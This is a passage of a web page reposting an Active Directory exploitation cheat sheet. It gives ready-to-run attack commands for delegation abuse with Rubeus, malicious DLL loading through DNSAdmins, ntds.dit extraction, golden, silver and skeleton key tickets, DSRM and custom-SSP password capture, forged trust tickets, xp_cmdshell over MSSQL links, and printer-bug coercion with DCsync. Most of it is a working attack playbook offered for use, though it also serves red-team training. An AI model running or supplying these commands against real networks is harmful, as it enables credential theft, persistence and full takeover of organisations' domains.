Using Rubeus:</p><pre tabindex=0><code>Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:&#34;&lt;Service&#39;s SPN&gt;&#34; /altservice:&lt;Optional&gt; /ptt
</code></pre><p>Now we can access the service as the impersonated user!</p><p>:triangular_flag_on_post: <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p><p>In this case we can still abuse a feature of kerberos called &ldquo;alternative service&rdquo;. This allows us to request TGS tickets for other &ldquo;alternative&rdquo; services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p><h3 id=resource-based-constrained-delegation>Resource Based Constrained Delegation<a hidden class=anchor aria-hidden=true href=#resource-based-constrained-delegation>#</a></h3><p><em>WUT IS DIS?:<br>TL;DR<br>If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.</em></p><p>Tools we are going to use:</p><ul><li><a href=https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon>PowerView</a></li><li><a href=https://github.com/Kevin-Robertson/Powermad>Powermad</a></li><li><a href=https://github.com/GhostPack/Rubeus>Rubeus</a></li></ul><p>First we need to enter the security context of the user/machine account that has the privileges over the object.
If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p><p>Exploitation Example:</p><pre tabindex=0><code>#Import Powermad and use it to create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString &#39;p@ssword!&#39; -AsPlainText -Force) -Verbose

#Import PowerView and get the SID of our new created machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid

#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&#34;
$SDBytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDBytes, 0)

#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#39;re taking over, again using PowerView
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose

#After that we need to get the RC4 hash of the new machine account&#39;s password using Rubeus
Rubeus.exe hash /password:&#39;p@ssword!&#39;

#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus
Rubeus.exe s4u /user:&lt;MachineAccountName&gt; /rc4:&lt;RC4HashOfMachineAccountPassword&gt; /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#Finally we can access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
</code></pre><p>Detailed Articles:</p><ul><li><a href=https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li><li><a href=https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/>RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></li></ul><p>:exclamation: In Constrain and Resource-Based Constrained Delegation if we don&rsquo;t have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick &ldquo;tgt::deleg&rdquo; from kekeo or &ldquo;tgtdeleg&rdquo; from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p><pre tabindex=0><code>#Command on Rubeus
Rubeus.exe tgtdeleg /nowrap
</code></pre><p>Detailed Article:
<a href=https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/>Rubeus – Now With More Kekeo</a></p><h3 id=dnsadmins-abuse>DNSAdmins Abuse<a hidden class=anchor aria-hidden=true href=#dnsadmins-abuse>#</a></h3><p><em>WUT IS DIS ?: If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.</em></p><ol><li>Enumerate the members of the DNSAdmins group:<ul><li>PowerView: <code>Get-NetGroupMember -GroupName "DNSAdmins"</code></li><li>AD Module: <code>Get-ADGroupMember -Identiny DNSAdmins</code></li></ul></li><li>Once we found a member of this group we need to compromise it (There are many ways).</li><li>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:<pre tabindex=0><code>#Using dnscmd:
dnscmd &lt;NameOfDNSMAchine&gt; /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

#Restart the DNS Service:
sc \\DNSServer stop dns
sc \\DNSServer start dns
</code></pre></li></ol><h3 id=abusing-active-directory-integraded-dns>Abusing Active Directory-Integraded DNS<a hidden class=anchor aria-hidden=true href=#abusing-active-directory-integraded-dns>#</a></h3><ul><li><a href=https://blog.netspi.com/exploiting-adidns/>Exploiting Active Directory-Integrated DNS</a></li><li><a href=https://blog.netspi.com/adidns-revisited/>ADIDNS Revisited</a></li><li><a href=https://github.com/Kevin-Robertson/Inveigh>Inveigh</a></li></ul><h3 id=abusing-backup-operators-group>Abusing Backup Operators Group<a hidden class=anchor aria-hidden=true href=#abusing-backup-operators-group>#</a></h3><p><em>WUT IS DIS ?: If we manage to compromise a user account that is member of the Backup Operators
group, we can then abuse it&rsquo;s SeBackupPrivilege to create a shadow copy of the current state of the DC,
extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.</em></p><ol><li>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</li></ol><pre tabindex=0><code>#Create a .txt file that will contain the shadow copy process script
Script -&gt;{
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  
 
create  
  
expose %mydrive% w:  
end backup  
}

#Execute diskshadow with our script as parameter
diskshadow /s script.txt
</code></pre><ol start=2><li>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just
simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are
going to use <a href=https://github.com/giuliano108/SeBackupPrivilege>this</a> amazing repo:</li></ol><pre tabindex=0><code>#Importing both dlls from the repo using powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
  
#Checking if the SeBackupPrivilege is enabled
Get-SeBackupPrivilege
  
#If it isn&#39;t we enable it
Set-SeBackupPrivilege
  
#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite
  
#Dump the SYSTEM hive
reg save HKLM\SYSTEM c:\temp\system.hive 
</code></pre><ol start=3><li>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</li><li>Use secretsdump.py from impacket and dump the hashes.</li><li>Use psexec or another tool of your choice to PTH and get Domain Admin access.</li></ol><h3 id=abusing-exchange>Abusing Exchange<a hidden class=anchor aria-hidden=true href=#abusing-exchange>#</a></h3><ul><li><a href=https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/>Abusing Exchange one Api call from DA</a></li><li><a href=https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys>CVE-2020-0688</a></li><li><a href=https://github.com/dirkjanm/PrivExchange>PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</li></ul><h3 id=weaponizing-printer-bug>Weaponizing Printer Bug<a hidden class=anchor aria-hidden=true href=#weaponizing-printer-bug>#</a></h3><ul><li><a href=https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/>Printer Server Bug to Domain Administrator</a></li><li><a href=https://github.com/NotMedic/NetNTLMtoSilverTicket>NetNTLMtoSilverTicket</a></li></ul><h3 id=abusing-acls>Abusing ACLs<a hidden class=anchor aria-hidden=true href=#abusing-acls>#</a></h3><ul><li><a href=https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/>Escalating privileges with ACLs in Active Directory</a></li><li><a href=https://github.com/fox-it/aclpwn.py>aclpwn.py</a></li><li><a href=https://github.com/fox-it/Invoke-ACLPwn>Invoke-ACLPwn</a></li></ul><h3 id=abusing-ipv6-with-mitm6>Abusing IPv6 with mitm6<a hidden class=anchor aria-hidden=true href=#abusing-ipv6-with-mitm6>#</a></h3><ul><li><a href=https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/>Compromising IPv4 networks via IPv6</a></li><li><a href=https://github.com/fox-it/mitm6>mitm6</a></li></ul><h3 id=sid-history-abuse>SID History Abuse<a hidden class=anchor aria-hidden=true href=#sid-history-abuse>#</a></h3><p><em>WUT IS DIS?: If we manage to compromise a child domain of a forest and <a href=https://www.itprotoday.com/windows-8/sid-filtering>SID filtering</a> isn&rsquo;t enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a href=https://www.itprotoday.com/windows-8/sid-history>SID History</a> field on a kerberos TGT ticket, that defines the &ldquo;extra&rdquo; security groups and privileges.</em></p><p>Exploitation example:</p><pre tabindex=0><code>#Get the SID of the Current Domain using PowerView
Get-DomainSID -Domain current.root.domain.local

#Get the SID of the Root Domain using PowerView
Get-DomainSID -Domain root.domain.local

#Create the Enteprise Admins SID
Format: RootDomainSID-519

#Forge &#34;Extra&#34; Golden Ticket using mimikatz
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

#Inject the ticket into memory
kerberos::ptt \path\to\ticket\golden.kirbi

#List the DC of the Root Domain
dir \\dc.root.domain.local\C$

#Or DCsync and dump the hashes using mimikatz
lsadump::dcsync /domain:root.domain.local /all
</code></pre><p>Detailed Articles:</p><ul><li><a href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden</a></li><li><a href=http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/>A Guide to Attacking Domain Trusts</a></li></ul><h3 id=exploiting-sharepoint>Exploiting SharePoint<a hidden class=anchor aria-hidden=true href=#exploiting-sharepoint>#</a></h3><ul><li><a href=https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d>CVE-2019-0604</a> RCE Exploitation<br><a href=https://github.com/k8gege/CVE-2019-0604>PoC</a></li><li><a href=https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization>CVE-2019-1257</a> Code execution through BDC deserialization</li><li><a href=https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters>CVE-2020-0932</a> RCE using typeconverters<br><a href=https://github.com/thezdi/PoC/tree/master/CVE-2020-0932>PoC</a></li></ul><h3 id=zerologon-exploit>Zerologon Exploit<a hidden class=anchor aria-hidden=true href=#zerologon-exploit>#</a></h3><ul><li><a href="https://www.secura.com/pathtoimg.php?id=2055">Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</li><li><a href=https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon>SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</li><li><a href=https://github.com/BC-SECURITY/Invoke-ZeroLogon>Invoke-ZeroLogon</a>: Powershell implementation of the Zerologon exploit.</li><li><a href=https://github.com/bb00/zer0dump>Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</li></ul><h2 id=domain-persistence>Domain Persistence<a hidden class=anchor aria-hidden=true href=#domain-persistence>#</a></h2><h3 id=golden-ticket-attack>Golden Ticket Attack<a hidden class=anchor aria-hidden=true href=#golden-ticket-attack>#</a></h3><pre tabindex=0><code>#Execute mimikatz on DC as DA to grab krbtgt hash:
Invoke-Mimikatz -Command &#39;&#34;lsadump::lsa /patch&#34;&#39; -ComputerName &lt;DC&#39;sName&gt;

#On any machine:
Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain&#39;s SID&gt; /krbtgt:
&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&#34;&#39;
</code></pre><h3 id=dcsync-attack>DCsync Attack<a hidden class=anchor aria-hidden=true href=#dcsync-attack>#</a></h3><pre tabindex=0><code>#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
Invoke-Mimikatz -Command &#39;&#34;lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;&#34;&#39;

#DCsync using secretsdump.py from impacket with NTLM authentication
secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC&#39;S IP or FQDN&gt; -just-dc-ntlm

#DCsync using secretsdump.py from impacket with Kerberos Authentication
secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC&#39;S IP or FQDN&gt; -just-dc-ntlm
</code></pre><p><strong>Tip:</strong><br>/ptt -> inject ticket on current running session<br>/ticket -> save the ticket on the system for later use</p><h3 id=silver-ticket-attack>Silver Ticket Attack<a hidden class=anchor aria-hidden=true href=#silver-ticket-attack>#</a></h3><pre tabindex=0><code>Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:
&lt;ServiceType&gt; /rc4:&lt;TheSPN&#39;s Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt&#34;&#39;
</code></pre><p><a href="https://adsecurity.org/?page_id=183">SPN List</a></p><h3 id=skeleton-key-attack>Skeleton Key Attack<a hidden class=anchor aria-hidden=true href=#skeleton-key-attack>#</a></h3><pre tabindex=0><code>#Exploitation Command runned as DA:
Invoke-Mimikatz -Command &#39;&#34;privilege::debug&#34; &#34;misc::skeleton&#34;&#39; -ComputerName &lt;DC&#39;s FQDN&gt;

#Access using the password &#34;mimikatz&#34;
Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator
</code></pre><h3 id=dsrm-abuse>DSRM Abuse<a hidden class=anchor aria-hidden=true href=#dsrm-abuse>#</a></h3><p><em>WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</em></p><pre tabindex=0><code>#Dump DSRM password (needs DA privs):
Invoke-Mimikatz -Command &#39;&#34;token::elevate&#34; &#34;lsadump::sam&#34;&#39; -ComputerName &lt;DC&#39;s Name&gt;

#This is a local account, so we can PTH and authenticate!
#BUT we need to alter the behaviour of the DSRM account before pth:
#Connect on DC:
Enter-PSSession -ComputerName &lt;DC&#39;s Name&gt;

#Alter the Logon behaviour on registry:
New-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -Name &#34;DsrmAdminLogonBehaviour&#34; -Value 2 -PropertyType DWORD -Verbose

#If the property already exists:
Set-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -Name &#34;DsrmAdminLogonBehaviour&#34; -Value 2 -Verbose
</code></pre><p>Then just PTH to get local admin access on DC!</p><h3 id=custom-ssp>Custom SSP<a hidden class=anchor aria-hidden=true href=#custom-ssp>#</a></h3><p><em>WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</em></p><p>From powershell:</p><pre tabindex=0><code>#Get current Security Package:
$packages = Get-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&#34; -Name &#39;Security Packages&#39; | select -ExpandProperty  &#39;Security Packages&#39;

#Append mimilib:
$packages += &#34;mimilib&#34;

#Change the new packages name
Set-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&#34; -Name &#39;Security Packages&#39; -Value $packages
Set-ItemProperty &#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34; -Name &#39;Security Packages&#39; -Value $packages

#ALTERNATIVE:
Invoke-Mimikatz -Command &#39;&#34;misc::memssp&#34;&#39;
</code></pre><p>Now all logons on the DC are logged to -> C:\Windows\System32\kiwissp.log</p><h2 id=cross-forest-attacks>Cross Forest Attacks<a hidden class=anchor aria-hidden=true href=#cross-forest-attacks>#</a></h2><h3 id=trust-tickets>Trust Tickets<a hidden class=anchor aria-hidden=true href=#trust-tickets>#</a></h3><p><em>WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</em></p><p>:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!</p><p>Using Mimikatz:</p><pre tabindex=0><code>#Dump the trust key
Invoke-Mimikatz -Command &#39;&#34;lsadump::trust /patch&#34;&#39;
Invoke-Mimikatz -Command &#39;&#34;lsadump::lsa /patch&#34;&#39;

#Forge an inter-realm TGT using the Golden Ticket attack
Invoke-Mimikatz -Command &#39;&#34;kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:  
&lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:
&lt;PathToSaveTheGoldenTicket&gt;&#34;&#39;
</code></pre><p>:exclamation: Tickets -> .kirbi format</p><p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p><p>Using Rubeus:</p><pre tabindex=0><code>.\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:&#34;Service&#39;s SPN&#34; /ptt
</code></pre><h3 id=abuse-mssql-servers>Abuse MSSQL Servers<a hidden class=anchor aria-hidden=true href=#abuse-mssql-servers>#</a></h3><ul><li>Enumerate MSSQL Instances: <code>Get-SQLInstanceDomain</code></li><li>Check Accessibility as current user:</li></ul><pre tabindex=0><code>Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</code></pre><ul><li>Gather Information about the instance: <code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li><li>Abusing SQL Database Links:<br><em>WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</em></li></ul><p>Check for existing Database Links:</p><pre tabindex=0><code>#Check for existing Database Links:
#PowerUpSQL:
Get-SQLServerLink -Instace &lt;SPN&gt; -Verbose
     
#MSSQL Query:
select * from master..sysservers
</code></pre><p>Then we can use queries to enumerate other links from the linked Database:</p><pre tabindex=0><code>#Manualy:
select * from openquery(&#34;LinkedDatabase&#34;, &#39;select * from master..sysservers&#39;)
     
#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
Get-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose
     
#Then we can execute command on the machine&#39;s were the SQL Service runs using xp_cmdshell
#Or if it is disabled enable it:
EXECUTE(&#39;sp_configure &#34;xp_cmdshell&#34;,1;reconfigure;&#39;) AT &#34;SPN&#34;
</code></pre><p>Query execution:</p><pre tabindex=0><code>Get-SQLServerLinkCrawl -Instace &lt;SPN&gt; -Query &#34;exec master..xp_cmdshell &#39;whoami&#39;&#34;
</code></pre><h3 id=breaking-forest-trusts>Breaking Forest Trusts<a hidden class=anchor aria-hidden=true href=#breaking-forest-trusts>#</a></h3><p><em>WUT IS DIS?:<br>TL;DR<br>If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest&rsquo;s root domain to authenticate to us. Then we can capture it&rsquo;s TGT, inject it into memory and DCsync to dump it&rsquo;s hashes, giving ous complete access over the whole forest.</em></p><p>Tools we are going to use:</p><ul><li><a href=https://github.com/GhostPack/Rubeus>Rubeus</a></li><li><a href=https://github.com/leechristensen/SpoolSample>SpoolSample</a></li><li><a href=https://github.com/gentilkiwi/mimikatz>Mimikatz</a></li></ul><p>Exploitation example:</p><pre tabindex=0><code>#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:&lt;Base64ValueofCapturedTicket&gt;

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all 
</code></pre><p>Detailed Articles:</p><ul><li><a href=https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/>Not A Security Boundary: Breaking Forest Trusts</a></li><li><a href=https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1>Hunting in Active Directory: Unconstrained Delegation & Forests Trusts</a></li></ul><blockquote><p>Source: <a href=https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md>GitHub</a></p></blockquote><hr><script type=text/javascript language=javascript>var aax_size="728x90",aax_pubname="anir0y-21",aax_src="302"</script><script type=text/javascript language=javascript src=https://c.amazon-adsystem.com/aax2/assoc.js></script></div><footer class=post-footer><ul class=post-tags><li><a href=https://classroom.anir0y.in/tags/notes/>Notes</a></li></ul><nav class=paginav><a class=prev href=https://classroom.anir0y.in/post/cyber-security-interview-questions-with-answers/><span class=title>« Prev</span><br><span>Cyber Security Interview Questions With Answers</span>
</a><a class=next href=https://classroom.anir0y.in/post/notes-osimodel-explained/><span class=title>Next »</span><br><span>Notes OSIModel Explained</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on x" href="https://x.com/intent/tweet/?text=Active%20Directory%20Exploitation%20Cheat%20Sheet&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f&amp;hashtags=notes"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f&amp;title=Active%20Directory%20Exploitation%20Cheat%20Sheet&amp;summary=Active%20Directory%20Exploitation%20Cheat%20Sheet&amp;source=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f&title=Active%20Directory%20Exploitation%20Cheat%20Sheet"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on whatsapp" href="https://api.whatsapp.com/send?text=Active%20Directory%20Exploitation%20Cheat%20Sheet%20-%20https%3a%2f%2fclassroom.anir0y.in%2fpost%2factive-directory-exploitation-cheat-sheet%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Active Directory Exploitation Cheat Sheet on telegram" 